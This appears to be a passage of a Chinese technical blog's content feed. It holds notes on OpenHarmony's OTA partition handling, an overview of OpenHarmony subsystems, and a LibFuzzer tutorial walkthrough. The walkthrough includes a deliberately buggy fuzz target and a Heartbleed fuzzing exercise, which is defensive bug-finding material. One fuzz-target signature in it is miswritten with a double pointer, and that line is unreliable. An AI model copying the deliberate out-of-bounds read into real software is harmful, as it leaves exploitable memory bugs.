class="string">&quot;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">    &#123; PARTITION_DATA, <span class="string">&quot;data&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">    &#123; PARTITION_OTA_TAG, <span class="string">&quot;ota_tag&quot;</span>, <span class="string">&quot;/sdcard/update/OTA.tag&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">    &#123; PARTITION_OTA_CONFIG, <span class="string">&quot;config&quot;</span>, <span class="string">&quot;/sdcard/update/config&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">    &#123; PARTITION_ROOTFS_EXT4, <span class="string">&quot;rootfs_ext4&quot;</span>, <span class="string">&quot;/sdcard/update/rootfs_ext4.img&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">    &#123; PARTITION_MAX, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="Partition对OTA的影响"><a href="#Partition对OTA的影响" class="headerlink" title="Partition对OTA的影响"></a>Partition对OTA的影响</h2><h3 id="1-数据路由影响"><a href="#1-数据路由影响" class="headerlink" title="1. 数据路由影响"></a>1. 数据路由影响</h3><p><strong>分区选择机制</strong>:</p>
<ul>
<li>通过<code>GetCurrentDloadCompPartition</code>函数，根据组件名称映射到具体的分区ID</li>
<li>不同的分区ID决定了数据最终写入的物理位置</li>
</ul>
<h3 id="2-双分区升级机制"><a href="#2-双分区升级机制" class="headerlink" title="2. 双分区升级机制"></a>2. 双分区升级机制</h3><p><strong>KERNEL_A vs KERNEL_B</strong>:</p>
<ul>
<li><code>PARTITION_KERNEL_A</code> (3): 当前运行的内核分区</li>
<li><code>PARTITION_KERNEL_B</code> (4): 备用内核分区，用于A&#x2F;B分区升级</li>
<li>支持无缝升级和快速回滚</li>
</ul>
<h3 id="3-信息组件特殊处理"><a href="#3-信息组件特殊处理" class="headerlink" title="3. 信息组件特殊处理"></a>3. 信息组件特殊处理</h3><p><strong>PARTITION_INFO_COMP</strong> (1):</p>
<ul>
<li>特殊处理，不直接写入存储</li>
<li>数据缓存在内存中，用于验证和解析升级包信息</li>
<li>包含组件列表、版本信息、签名数据等</li>
</ul>
<h3 id="4-HAL层写入行为"><a href="#4-HAL层写入行为" class="headerlink" title="4. HAL层写入行为"></a>4. HAL层写入行为</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">HotaHalWrite</span><span class="params">(<span class="type">int</span> partition, <span class="type">unsigned</span> <span class="type">char</span> *buffer, <span class="type">unsigned</span> <span class="type">int</span> offset, <span class="type">unsigned</span> <span class="type">int</span> buffLen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (partition == PARTITION_INFO_COMP) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;partition == PARTITION_INFO_COMP, skip it.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> OHOS_SUCCESS;  <span class="comment">// 信息组件跳过HAL写入</span></span><br><span class="line">    &#125;</span><br><span class="line">    hi_u32 result = hi_upg_transmit(offset, buffer, buffLen);</span><br><span class="line">    <span class="keyword">if</span> (result != HI_ERR_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hi_upg_transmit failed. retCode = %x.\r\n&quot;</span>, result);</span><br><span class="line">        <span class="keyword">return</span> OHOS_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> OHOS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>不同分区的写入行为</strong>:</p>
<ul>
<li><strong>信息组件</strong>: 跳过HAL写入，仅在内存中处理</li>
<li><strong>其他组件</strong>: 通过<code>hi_upg_transmit</code>写入到对应的Flash分区</li>
</ul>
<h3 id="5-错误处理影响"><a href="#5-错误处理影响" class="headerlink" title="5. 错误处理影响"></a>5. 错误处理影响</h3><p><strong>分区错误的影响</strong>:</p>
<ul>
<li><code>PARTITION_ERROR</code> (-1): 表示分区映射失败</li>
<li>导致升级失败，系统状态回到<code>HOTA_FAILED</code></li>
<li>触发错误回调<code>HOTA_DATA_WRITE_ERR</code></li>
</ul>
<h3 id="6-升级策略影响"><a href="#6-升级策略影响" class="headerlink" title="6. 升级策略影响"></a>6. 升级策略影响</h3><p><strong>不同分区的升级策略</strong>:</p>
<ol>
<li><strong>Bootloader</strong>: 通常需要特殊的升级保护机制</li>
<li><strong>Kernel</strong>: 支持A&#x2F;B分区无缝升级</li>
<li><strong>RootFS</strong>: 文件系统级别的升级</li>
<li><strong>App</strong>: 应用程序更新</li>
<li><strong>Data</strong>: 用户数据分区，通常保持不变</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>StashRecvDataToBuffer</code>函数通过partition参数实现了灵活的数据路由机制：</p>
<ol>
<li><strong>信息组件</strong>：内存缓存，用于元数据解析和验证</li>
<li><strong>系统组件</strong>：写入对应的Flash分区，支持A&#x2F;B分区升级</li>
<li><strong>错误处理</strong>：通过分区ID验证确保升级安全性<br>Partition的选择直接影响了：</li>
</ol>
<ul>
<li>数据的物理存储位置</li>
<li>升级策略（A&#x2F;B分区、原地升级等）</li>
<li>系统的启动行为</li>
<li>升级失败时的恢复机制<br>这种设计确保了OTA升级过程的灵活性和安全性，支持不同类型组件的差异化处理。</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>OpenHarmony浅析</title>
    <url>/posts/22c8fb23.html</url>
    <content><![CDATA[<p>阅读下OpenHarmony的<a href="https://gitee.com/openharmony">gitee仓库</a></p>
<h2 id="组件成分"><a href="#组件成分" class="headerlink" title="组件成分"></a>组件成分</h2><h2 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h2><p>内核层、系统服务层、框架层、应用层</p>
<h3 id="内核层"><a href="#内核层" class="headerlink" title="内核层"></a>内核层</h3><p>内核层包括内核子系统与驱动子系统，内核子系统包括Linux kernel和lite os，Linux Kernel为标准全量系统；lite os为RTOS系统，分为轻量系统和小型系统，轻量系统适合硬件资源极其有限的硬件设备（ARM Cortex-M），，小型系统则介于标准系统与轻量系统之间（ARM Cortex-A）。</p>
<h3 id="系统服务层"><a href="#系统服务层" class="headerlink" title="系统服务层"></a>系统服务层</h3><p>为OpenHarmony的核心能力集合，通过框架层来向上层提供服务。分为四类子系统集合，与框架层对应</p>
<ul>
<li>系统基本能力子系统集</li>
<li>基础软件服务子系统集</li>
<li>增强软件服务子系统集</li>
<li>硬件服务子系统集</li>
</ul>
<h3 id="框架层"><a href="#框架层" class="headerlink" title="框架层"></a>框架层</h3><p>提供了C&#x2F;C++&#x2F;JS用户应用程序框架和Ability框架，ArkUI为JS</p>
<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>包括系统应用和第三方应用。应用由FA或PA组成，FA负责前端交互UI，PA负责后台运行任务以及统一的数据访问抽象。</p>
<h2 id="子系统功能-联系"><a href="#子系统功能-联系" class="headerlink" title="子系统功能&#x2F;联系"></a>子系统功能&#x2F;联系</h2><p>先直接贴下readme的表格描述XD。<br>以下为OpenHarmony中相关的子系统简介，详细介绍见子系统Readme文档，入口：<a href="https://gitee.com/openharmony/docs/tree/master/zh-cn/readme">https://gitee.com/openharmony/docs/tree/master/zh-cn/readme</a>。</p>
<table>
<thead>
<tr>
<th>子系统</th>
<th>简 介</th>
<th>适用范围</th>
</tr>
</thead>
<tbody><tr>
<td>内核</td>
<td>支持适用于嵌入式设备及资源受限设备，具有小体积、高性能、低功耗等特征的LiteOS内核；支持基于linux kernel演进的适用于标准系统的linux内核。</td>
<td>小型系统  <br>标准系统</td>
</tr>
<tr>
<td>分布式文件</td>
<td>提供本地同步JS文件接口。</td>
<td>标准系统</td>
</tr>
<tr>
<td>图形</td>
<td>主要包括UI组件、布局、动画、字体、输入事件、窗口管理、渲染绘制等模块，构建基于轻量OS应用框架满足硬件资源较小的物联网设备或者构建基于标准OS的应用框架满足富设备（如平板和轻智能机等）的OpenHarmony系统应用开发。</td>
<td>所有系统</td>
</tr>
<tr>
<td>驱动</td>
<td>OpenHarmony驱动子系统采用C面向对象编程模型构建，通过平台解耦、内核解耦，兼容不同内核，提供了归一化的驱动平台底座，旨在为开发者提供更精准、更高效的开发环境，力求做到一次开发，多系统部署。</td>
<td>所有系统</td>
</tr>
<tr>
<td>电源管理服务</td>
<td>电源管理服务子系统提供如下功能：重启系统；管理休眠运行锁；系统电源状态管理和查询；充电和电池状态查询和上报；显示亮灭屏状态管理，包括显示亮度调节。</td>
<td>标准系统</td>
</tr>
<tr>
<td>泛Sensor服务</td>
<td>泛Sensor中包含传感器和小器件，传感器用于侦测环境中所发生事件或变化，并将此消息发送至其他电子设备，小器件用于向外传递信号的设备，包括马达和LED灯，对开发者提供控制马达振动和LED灯开关的能力。</td>
<td>小型系统</td>
</tr>
<tr>
<td>多模输入</td>
<td>OpenHarmony旨在为开发者提供NUI（Natural User Interface）的交互方式，有别于传统操作系统的输入，在OpenHarmony上，我们将多种维度的输入整合在一起，开发者可以借助应用程序框架、系统自带的UI组件或API接口轻松地实现具有多维、自然交互特点的应用程序。具体来说，多模输入子系统目前支持传统的输入交互方式，例如按键和触控。</td>
<td>标准系统</td>
</tr>
<tr>
<td>启动恢复</td>
<td>启动恢复负责在内核启动之后，应用启动之前的操作系统中间层的启动。并提供系统属性查询、修改及设备恢复出厂设置的功能。</td>
<td>所有系统</td>
</tr>
<tr>
<td>升级服务</td>
<td>可支持OpenHarmony设备的OTA（Over The Air）升级。</td>
<td>标准系统</td>
</tr>
<tr>
<td>帐号</td>
<td>支持在端侧对接厂商云帐号应用，提供分布式帐号登录状态查询和更新的管理能力。</td>
<td>标准系统</td>
</tr>
<tr>
<td>编译构建</td>
<td>编译构建子系统提供了一个基于Gn和ninja的编译构建框架。</td>
<td>所有系统</td>
</tr>
<tr>
<td>测试</td>
<td>开发过程采用测试驱动开发模式，开发者基于系统新增特性可以通过开发者自己开发用例保证，对于系统已有特性的修改，也可通过修改项目中原有的测试用例保证，开发者测试旨在帮助开发者在开发阶段就能开发出高质量代码。</td>
<td>所有系统</td>
</tr>
<tr>
<td>数据管理</td>
<td>数据管理支持应用本地数据管理和分布式数据管理：  <br>- 支持应用本地数据管理，包括轻量级偏好数据库，关系型数据库。  <br>- 支持分布式数据服务，为应用程序提供不同设备间数据库数据分布式的能力。</td>
<td>标准系统</td>
</tr>
<tr>
<td>语言编译运行时</td>
<td>语言运行时提供了JS、C&#x2F;C++语言程序的编译、执行环境，提供支撑运行时的基础库，以及关联的API接口、编译器和配套工具。</td>
<td>所有系统</td>
</tr>
<tr>
<td>分布式任务调度</td>
<td>提供系统服务的启动、注册、查询及管理能力。</td>
<td>所有系统</td>
</tr>
<tr>
<td>JS UI框架</td>
<td>JS UI框架是OpenHarmony UI开发框架，支持类Web范式编程。</td>
<td>所有系统</td>
</tr>
<tr>
<td>媒体</td>
<td>提供音频、视频、相机等简单有效的媒体组件开发接口，使得应用开发者轻松使用系统的多媒体资源。</td>
<td>所有系统</td>
</tr>
<tr>
<td>事件通知</td>
<td>公共事件管理实现了订阅、退订、发布、接收公共事件（例如亮灭屏事件、USB插拔事件）的能力。</td>
<td>标准系统</td>
</tr>
<tr>
<td>杂散软件服务</td>
<td>提供设置时间的能力。</td>
<td>标准系统</td>
</tr>
<tr>
<td>包管理子系统</td>
<td>提供包安装、卸载、更新、查询等能力。</td>
<td>所有系统</td>
</tr>
<tr>
<td>电话服务</td>
<td>提供SIM卡、搜网、蜂窝数据、蜂窝通话、短彩信等蜂窝移动网络基础通信能力，可管理多类型通话和数据网络连接，为应用开发者提供便捷一致的通信API。</td>
<td>标准系统</td>
</tr>
<tr>
<td>公共基础类库</td>
<td>公共基础库存放OpenHarmony通用的基础组件。这些基础组件可被OpenHarmony各业务子系统及上层应用所使用。</td>
<td>所有系统</td>
</tr>
<tr>
<td>研发工具链</td>
<td>提供设备连接调试器hdc；提供了性能跟踪能力和接口；提供了性能调优框架，旨在为开发者提供一套性能调优平台，可以用来分析内存、性能等问题。</td>
<td>标准系统</td>
</tr>
<tr>
<td>分布式软总线</td>
<td>分布式软总线旨在为OpenHarmony系统提供跨进程或跨设备的通信能力，主要包含软总线和进程间通信两部分。其中，软总线为应用和系统提供近场设备间分布式通信的能力，提供不区分通信方式的设备发现，连接，组网和传输功能；而进程间通信则提供了对设备内或设备间无差别的进程间通信能力。</td>
<td>所有系统</td>
</tr>
<tr>
<td>XTS</td>
<td>XTS是OpenHarmony兼容性测试套件的集合，当前包括acts（application compatibility test suite）应用兼容性测试套，后续会拓展dcts（device compatibility test suite）设备兼容性测试套等。</td>
<td>所有系统</td>
</tr>
<tr>
<td>系统应用</td>
<td>系统应用提供了OpenHarmony标准版上的部分系统应用，如桌面、SystemUI、设置等应用，为开发者提供了构建标准版应用的具体实例，这些应用支持在所有标准版系统的设备上使用。</td>
<td>标准系统</td>
</tr>
<tr>
<td>DFX</td>
<td>DFX是OpenHarmony非功能属性能力，包含日志系统、应用和系统事件日志接口、事件日志订阅服务、故障信息生成采集等功能。</td>
<td>所有系统</td>
</tr>
<tr>
<td>全球化</td>
<td>当OpenHarmony设备或应用在全球不同区域使用时，系统和应用需要满足不同市场用户关于语言、文化习俗的需求。全球化子系统提供支持多语言、多文化的能力，包括资源管理能力和国际化能力。</td>
<td>所有系统</td>
</tr>
<tr>
<td>安全</td>
<td>安全子系统包括系统安全、数据安全、应用安全等模块，为OpenHarmony提供了保护系统和和用户数据的能力。安全子系统当前开源的功能，包括应用完整性保护、应用权限管理、设备认证、密钥管理服务。</td>
<td>所有系统</td>
</tr>
</tbody></table>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://gitee.com/openharmony">openharmony</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>LibFuzzer学习笔记</title>
    <url>/posts/8124d704.html</url>
    <content><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
<li>Ubuntu 22.04<br>安装源码：<figure class="highlight shell"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Install git and get this tutorial</span></span><br><span class="line">sudo apt-get --yes install git</span><br><span class="line">git clone https://github.com/google/fuzzing.git fuzzing</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Get fuzzer-test-suite</span></span><br><span class="line">git clone https://github.com/google/fuzzer-test-suite.git FTS</span><br><span class="line"></span><br><span class="line">./fuzzing/tutorial/libFuzzer/install-deps.sh  # Get deps</span><br><span class="line">./fuzzing/tutorial/libFuzzer/install-clang.sh # Get fresh clang binaries</span><br></pre></td></tr></table></figure>
验证：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clang++ -g -fsanitize=address,fuzzer fuzzing/tutorial/libFuzzer/fuzz_me.cc</span><br><span class="line">./a.out 2&gt;&amp;1 | grep ERROR</span><br></pre></td></tr></table></figure>
结果应该是ASAN检测到内存错误：<img src="/posts/8124d704/file-20250802130755383.png" class=""></li>
</ul>
<h2 id="入门Fuzzer编写"><a href="#入门Fuzzer编写" class="headerlink" title="入门Fuzzer编写"></a>入门Fuzzer编写</h2><h3 id="fuzz-target"><a href="#fuzz-target" class="headerlink" title="fuzz target"></a>fuzz target</h3><p>fuzz target定义：有如下格式定义的对参数进行操作的函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> **Data, <span class="type">size_t</span> Size)</span> &#123;</span><br><span class="line">  DoSomethingWithData(Data, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看刚刚运行的<code>./fuzz_me.cc</code>源码，当输入长度大于等于3时，会判断前四个元素是否为<code>FUZZ</code>，即存在越界读取问题。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">FuzzMe</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Data, <span class="type">size_t</span> DataSize)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> DataSize &gt;= <span class="number">3</span> &amp;&amp;</span><br><span class="line">      Data[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp;</span><br><span class="line">      Data[<span class="number">1</span>] == <span class="string">&#x27;U&#x27;</span> &amp;&amp;</span><br><span class="line">      Data[<span class="number">2</span>] == <span class="string">&#x27;Z&#x27;</span> &amp;&amp;</span><br><span class="line">      Data[<span class="number">3</span>] == <span class="string">&#x27;Z&#x27;</span>;  <span class="comment">// :‑&lt;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Data, <span class="type">size_t</span> Size)</span> &#123;</span><br><span class="line">  FuzzMe(Data, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了编译一个fuzzer二进制程序，需要使用Clang工具编译源码，并添加以下flags：</p>
<ul>
<li><code>-fsanitize=fuzzer</code>(required)：为libFuzzer提供进程内的覆盖率信息，并将其与libFuzzer运行时进行链接；</li>
<li><code>-fsanitize=address</code>(recommended)：开启ASAN检测；</li>
<li><code>-fno-omit-frame-pointer</code>：更好看的函数调用栈信息；</li>
<li><code>-O1</code>：编译优化；</li>
<li><code>-g</code>(recommended)：开启调试信息，令错误信息更易于阅读。<br>例如：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clang++ -g -fsanitize=address,fuzzer fuzzing/tutorial/libFuzzer/fuzz_me.cc</span><br></pre></td></tr></table></figure>
然后执行.&#x2F;a.out即可出现上面的结果截图。</li>
</ul>
<h3 id="输出信息解读"><a href="#输出信息解读" class="headerlink" title="输出信息解读"></a>输出信息解读</h3><p>其中有一段信息：<code>INFO: Seed: 4055535767</code>，表明fuzzer由此随机种子开始进行模糊测试。使用<code>-seed=4055535767</code>参数可以指定种子获得相同结果。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br></pre></td></tr></table></figure>
<p>默认情况下，libFuzzer假定所有输入都小于等于4096字节。可以使用<code>-max_len=N</code>或者添加种子来修改。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#<span class="number">2</span>      INITED cov: <span class="number">3</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1b</span> exec/s: <span class="number">0</span> rss: <span class="number">30</span>Mb</span><br><span class="line">#<span class="number">4</span>      NEW    cov: <span class="number">4</span> ft: <span class="number">4</span> corp: <span class="number">2</span>/<span class="number">4b</span> lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">30</span>Mb L: <span class="number">3</span>/<span class="number">3</span> MS: <span class="number">2</span> CrossOver-InsertByte-</span><br><span class="line">#<span class="number">1891</span>   NEW    cov: <span class="number">5</span> ft: <span class="number">5</span> corp: <span class="number">3</span>/<span class="number">25b</span> lim: <span class="number">21</span> exec/s: <span class="number">0</span> rss: <span class="number">30</span>Mb L: <span class="number">21</span>/<span class="number">21</span> MS: <span class="number">2</span> InsertRepeatedBytes-CMP- DE: <span class="string">&quot;F\000&quot;</span>-</span><br><span class="line">#<span class="number">1942</span>   REDUCE cov: <span class="number">5</span> ft: <span class="number">5</span> corp: <span class="number">3</span>/<span class="number">24b</span> lim: <span class="number">21</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">20</span>/<span class="number">20</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1946</span>   REDUCE cov: <span class="number">5</span> ft: <span class="number">5</span> corp: <span class="number">3</span>/<span class="number">16b</span> lim: <span class="number">21</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">12</span>/<span class="number">12</span> MS: <span class="number">4</span> ShuffleBytes-CrossOver-CrossOver-EraseBytes-</span><br><span class="line">#<span class="number">2038</span>   REDUCE cov: <span class="number">5</span> ft: <span class="number">5</span> corp: <span class="number">3</span>/<span class="number">13b</span> lim: <span class="number">21</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">9</span>/<span class="number">9</span> MS: <span class="number">2</span> ShuffleBytes-EraseBytes-</span><br><span class="line">#<span class="number">2063</span>   REDUCE cov: <span class="number">5</span> ft: <span class="number">5</span> corp: <span class="number">3</span>/<span class="number">9b</span> lim: <span class="number">21</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">5</span>/<span class="number">5</span> MS: <span class="number">5</span> CrossOver-CMP-ChangeBit-ShuffleBytes-EraseBytes- DE: <span class="string">&quot;F\000\000\000&quot;</span>-</span><br><span class="line">#<span class="number">2410</span>   REDUCE cov: <span class="number">5</span> ft: <span class="number">5</span> corp: <span class="number">3</span>/<span class="number">8b</span> lim: <span class="number">21</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">2</span> PersAutoDict-EraseBytes- DE: <span class="string">&quot;F\000\000\000&quot;</span>-</span><br><span class="line">#<span class="number">3038</span>   REDUCE cov: <span class="number">5</span> ft: <span class="number">5</span> corp: <span class="number">3</span>/<span class="number">7b</span> lim: <span class="number">25</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">3</span>/<span class="number">3</span> MS: <span class="number">3</span> CopyPart-ShuffleBytes-EraseBytes-</span><br><span class="line">#<span class="number">6341</span>   REDUCE cov: <span class="number">6</span> ft: <span class="number">6</span> corp: <span class="number">4</span>/<span class="number">11b</span> lim: <span class="number">53</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">3</span> PersAutoDict-InsertByte-CMP- DE: <span class="string">&quot;F\000&quot;</span>-<span class="string">&quot;U\000&quot;</span>-</span><br><span class="line">#<span class="number">6442</span>   REDUCE cov: <span class="number">6</span> ft: <span class="number">6</span> corp: <span class="number">4</span>/<span class="number">10b</span> lim: <span class="number">53</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">3</span>/<span class="number">3</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">28088</span>  REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">5</span>/<span class="number">17b</span> lim: <span class="number">261</span> exec/s: <span class="number">0</span> rss: <span class="number">32</span>Mb L: <span class="number">7</span>/<span class="number">7</span> MS: <span class="number">1</span> CMP- DE: <span class="string">&quot;Z\000\000\000&quot;</span>-</span><br><span class="line">#<span class="number">28250</span>  REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">5</span>/<span class="number">16b</span> lim: <span class="number">261</span> exec/s: <span class="number">0</span> rss: <span class="number">32</span>Mb L: <span class="number">6</span>/<span class="number">6</span> MS: <span class="number">2</span> CopyPart-EraseBytes-</span><br><span class="line">#<span class="number">28351</span>  REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">5</span>/<span class="number">15b</span> lim: <span class="number">261</span> exec/s: <span class="number">0</span> rss: <span class="number">32</span>Mb L: <span class="number">5</span>/<span class="number">5</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">28392</span>  REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">5</span>/<span class="number">14b</span> lim: <span class="number">261</span> exec/s: <span class="number">0</span> rss: <span class="number">32</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> EraseBytes-</span><br></pre></td></tr></table></figure>
<p>以上信息表示libFuzzer已经尝试了28392次输入，并且发现了5个种子14字节长度，实现覆盖7个点。点可以理解为代码中的基本块（入门可以先这么理解，其实应该叫边吧）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">==<span class="number">4197</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x6020000b5af3</span> at pc <span class="number">0x56907ee52f3c</span> bp <span class="number">0x7fff01c7e4f0</span> sp <span class="number">0x7fff01c7e4e8</span></span><br><span class="line">READ of size <span class="number">1</span> at <span class="number">0x6020000b5af3</span> thread T0</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x56907ee52f3b</span> in FuzzMe(<span class="type">unsigned</span> <span class="type">char</span> <span class="type">const</span>*, <span class="type">unsigned</span> <span class="type">long</span>) /home/eutopia/Fuzz_learning/LibFuzzer/fuzzing/tutorial/libFuzzer/fuzz_me.cc:<span class="number">9</span>:<span class="number">7</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x56907ee52fd4</span> in LLVMFuzzerTestOneInput /home/eutopia/Fuzz_learning/LibFuzzer/fuzzing/tutorial/libFuzzer/fuzz_me.cc:<span class="number">13</span>:<span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>存在一个输入使ASAN检测到<code>heap-buffer-overflow</code>错误并停止运行。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">artifact_prefix=&#x27;./&#x27;; Test unit written to ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60</span><br></pre></td></tr></table></figure>
<p>在退出前libFuzzer将引发crash的输入保存为文件，查看文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">base ❯ cat crash-0eb8e4ed029b774d80f2b66408203801cb982a60</span><br><span class="line">FUZ</span><br></pre></td></tr></table></figure>
<p>因为<code>FUZ</code>，导致通过了前面的一系列检查，并且对<code>data[3]</code>进行了访问，导致越界。</p>
<h2 id="心脏滴血漏洞实验"><a href="#心脏滴血漏洞实验" class="headerlink" title="心脏滴血漏洞实验"></a>心脏滴血漏洞实验</h2><p>fuzzer-test-suite包含了openssl-1.0.1f存在该漏洞<br>执行以下命令来编译fuzzer</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p ~/heartbleed; rm -rf ~/heartbleed/*; cd ~/heartbleed</span><br><span class="line">~/FTS/openssl-1.0.1f/build.sh</span><br></pre></td></tr></table></figure>
<p>编译完成后运行目标fuzzer，过一会后产生crash如下：</p>
<img src="/posts/8124d704/file-20250802175011280.png" class="">
<h2 id="种子语料库"><a href="#种子语料库" class="headerlink" title="种子语料库"></a>种子语料库</h2><p>设置多个参数指定种子目录时，会递归将所有目录中文件用于种子输入，然后如果模糊测试过程中出现了产生新覆盖率的种子，会将其保存在第一个目录中。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir MY_CORPUS</span><br><span class="line">./woff2-2016-05-06-fsanitize_fuzzer MY_CORPUS/ seeds/</span><br></pre></td></tr></table></figure>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>使用-dict参数设置字典目录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./libxml2-v2.9.2-fsanitize_fuzzer -dict=afl/dictionaries/xml.dict  # Press Ctrl-C in 10-20 seconds</span><br></pre></td></tr></table></figure>
<h2 id="将libFuzzer作为库"><a href="#将libFuzzer作为库" class="headerlink" title="将libFuzzer作为库"></a>将libFuzzer作为库</h2><p>如果目标代码必须提供<code>main</code>函数，那么需要将libFuzzer作为库函数调用执行。需要在编译时传递<code>-fsanitize=fuzzer-no-link</code>参数，并指定无main函数的libFuzzer版本，其路径为。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/lib/&lt;llvm-version&gt;/lib/clang/&lt;clang-version&gt;/lib/linux/libclang_rt.fuzzer_no_main-&lt;architecture&gt;.a</span><br></pre></td></tr></table></figure>
<p>代码可以执行正常功能，当需要开始模糊测试时，可以调用<code>LLVMFuzzerRunDriver</code>，传入程序参数和回调函数。类似<code>LLVMFuzzerTestOneInput</code>，且声明相同：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerRunDriver</span><span class="params">(<span class="type">int</span> *argc, <span class="type">char</span> ***argv,</span></span><br><span class="line"><span class="params">                  <span class="type">int</span> (*UserCb)(<span class="type">const</span> <span class="type">uint8_t</span> *Data, <span class="type">size_t</span> Size))</span>;</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.md">libFuzzer Tutorial</a></li>
<li><a href="https://llvm.org/docs/LibFuzzer.html">LibFuzzer Official site</a></li>
<li><a href="https://clang.llvm.org/docs/AddressSanitizer.html">ASAN</a></li>
</ul>
]]></content>
      <categories>
        <category>Fuzz</category>
      </categories>
  </entry>
  <entry>
    <title>强网杯2021线上赛 notebook</title>
